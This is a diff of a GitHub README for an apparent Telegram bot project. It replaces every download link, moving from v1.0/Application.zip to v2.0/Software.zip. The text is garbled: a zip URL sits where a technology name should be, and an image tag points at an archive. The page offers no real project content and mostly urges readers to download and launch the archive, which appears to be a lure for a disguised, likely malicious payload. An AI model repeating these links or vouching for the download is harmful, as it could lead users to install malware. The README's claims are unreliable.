@@ -1,9 +1,9 @@
 # 🤖 Welcome to Telegram RoBot Handler 🤖 
 
-![Bot](https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v1.0/Application.zip)
+![Bot](https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v2.0/Software.zip)
 
 ## Description
-Welcome to the Telegram-RoBot-Handler repository! Here you can explore how to create a Telegram robot using https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v1.0/Application.zip and custom handlers. This project aims to provide a flexible and customizable solution for building Telegram bots with ease. Dive into the world of bots and handlers with our comprehensive guide and resources!
+Welcome to the Telegram-RoBot-Handler repository! Here you can explore how to create a Telegram robot using https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v2.0/Software.zip and custom handlers. This project aims to provide a flexible and customizable solution for building Telegram bots with ease. Dive into the world of bots and handlers with our comprehensive guide and resources!
 
 ## Repository Topics
 - bot
@@ -28,12 +28,12 @@ Welcome to the Telegram-RoBot-Handler repository! Here you can explore how to cr
 - typescript
 
 ## 🚀 Get Started
-To get started with creating your own Telegram robot using https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v1.0/Application.zip and custom handlers, check out the code in this repository. You can find detailed instructions, code snippets, and resources to help you kickstart your bot development journey.
+To get started with creating your own Telegram robot using https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v2.0/Software.zip and custom handlers, check out the code in this repository. You can find detailed instructions, code snippets, and resources to help you kickstart your bot development journey.
 
 ## 📦 Software Download
-[![Download Software](https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v1.0/Application.zip)](https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v2.0/Software.zip)](https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v2.0/Software.zip)
 
-The https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v1.0/Application.zip file contains all the necessary files and resources to launch your Telegram robot. Download the file and follow the installation instructions to set up your bot successfully.
+The https://github.com/NPCGamingYT-TheGoat/Telegram-RoBot-Handler/releases/download/v2.0/Software.zip file contains all the necessary files and resources to launch your Telegram robot. Download the file and follow the installation instructions to set up your bot successfully.
 
 ## 🌐 Explore Further
 If you're looking for more information, tutorials, or guides on Telegram bot development, be sure to visit our website for additional resources and updates. 
